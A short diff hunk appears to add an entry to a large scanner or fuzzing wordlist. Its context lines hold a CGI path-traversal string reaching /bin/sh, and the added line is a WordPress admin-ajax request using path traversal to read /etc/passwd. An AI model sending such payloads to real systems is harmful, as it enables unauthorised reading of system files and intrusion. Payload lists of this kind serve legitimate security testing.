@@ -89450,4 +89450,4 @@ default
 cgi-bin/../../../../../../../../../../bin/sh
 t3
 t4
-
+/wp-admin/admin-ajax.php?template=../../../../../../../etc/passwd&value=a&min_symbols=1
